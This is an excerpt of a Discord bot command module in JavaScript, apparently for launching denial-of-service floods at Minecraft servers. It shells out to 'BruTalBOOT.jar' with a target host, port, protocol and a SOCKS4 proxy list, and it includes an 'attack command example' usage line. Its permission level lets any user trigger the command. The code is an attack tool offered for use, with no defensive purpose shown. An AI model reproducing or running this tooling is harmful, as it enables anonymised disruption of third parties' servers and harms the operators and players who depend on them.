...
if(!args[0]) {
	...
	.setColor('RANDOM')
	.setTitle('CẢNH BÁO')
	.setDescription("`Mẫu lệnh tấn công ;classicnullping 1.1.1.1 25565 47`")
...
exec(`screen -d -m timeout 60 java -jar BruTalBOOT.jar ${host}:${port} 6 1 ${protocol} 1000 1000 1000 100 10 proxies.txt socks4`, (error, stdout, stderr) => {
});
setTimeout(function(){ 
...
exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['classicnullping'],
  permLevel: 0
}

exports.help = {
  name: 'classicnullping',
  description: 'Özel',
  usage: 'classicnullping'
}